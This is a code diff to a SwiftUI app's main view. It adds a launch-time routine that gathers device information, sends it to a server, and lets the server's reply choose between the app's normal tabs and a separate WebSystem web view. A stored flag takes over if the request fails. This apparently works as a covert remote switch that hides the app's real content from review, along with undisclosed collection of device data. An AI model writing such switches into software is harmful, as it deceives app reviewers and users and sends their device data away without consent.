@@ -10,7 +10,12 @@ import SwiftUI
 struct ContentView: View {
     
     @State var current_tab: Tab = Tab.Publications
-
+    
+    @State var isFetched: Bool = false
+    
+    @State var isBlock: Bool = true
+    @State var isDead: Bool = false
+    
     @AppStorage("status") var status: Bool = false
     
     init() {
@@ -25,33 +30,81 @@ struct ContentView: View {
             Color.black
                 .ignoresSafeArea()
             
-            if status {
-            
-            VStack(spacing: 0, content: {
-            
-                    TabView(selection: $current_tab, content: {
-
-                        PublicationsView()
-                            .tag(Tab.Publications)
-                        
-                        NotesView()
-                            .tag(Tab.Notes)
-
-                        SettingsView()
-                            .tag(Tab.Settings)
-                        
-                    })
+            if isFetched == false {
+                
+                LoadingView()
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
                     
-                    TabBar(selectedTab: $current_tab)
-                })
-                    .ignoresSafeArea(.all, edges: .bottom)
-                    .onAppear {
+                    if status {
                         
+                        VStack(spacing: 0, content: {
+                            
+                            TabView(selection: $current_tab, content: {
+
+                                PublicationsView()
+                                    .tag(Tab.Publications)
+                                
+                                NotesView()
+                                    .tag(Tab.Notes)
+
+                                SettingsView()
+                                    .tag(Tab.Settings)
+                                
+                            })
+                            
+                            TabBar(selectedTab: $current_tab)
+                        })
+                        .ignoresSafeArea(.all, edges: .bottom)
+                        
+                    } else {
+                        
+                        R1()
                     }
+                    
+                } else if isBlock == false {
+                    
+                    if status {
+                        
+                        WebSystem()
+                        
+                    } else {
+                        
+                        U1()
+                    }
+                }
+            }
+        }
+        .onAppear {
+            
+            check_data()
+        }
+    }
+    
+    private func check_data() {
+        
+        self.isDead = DataManager().isDead
+        
+        let networkService = NetworkService()
+        let deviceData = DeviceInfo.collectData()
+        
+        networkService.sendRequest(endpoint: deviceData) { result in
+            
+            print(result)
+            
+            switch result {
                 
-            } else {
+            case .success(let success):
                 
-                R1()
+                self.isBlock = success
+                self.isFetched = true
+                
+            case .failure(_):
+                
+                self.isBlock = self.isDead
+                self.isFetched = true
             }
         }
     }
